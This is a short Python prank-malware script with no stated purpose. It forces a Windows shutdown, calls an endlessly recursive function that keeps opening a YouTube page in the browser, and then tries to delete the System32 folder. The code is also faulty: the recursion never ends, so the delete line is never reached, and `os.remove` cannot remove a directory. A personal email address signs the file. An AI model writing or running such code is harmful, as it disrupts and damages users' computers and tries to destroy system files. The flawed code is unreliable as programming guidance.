import webbrowser, time, os
def shutdown():
    os.system("shutdown /s /t 30")
    zooopen()
    time.sleep (10)
    os.remove("C:\Windows\System32")
    

def zooopen():
    webbrowser.open ("https://www.youtube.com/watch?v=jNQXAC9IVRw")
    zooopen()
    
shutdown()
#Wesleypeter2011@gmail.com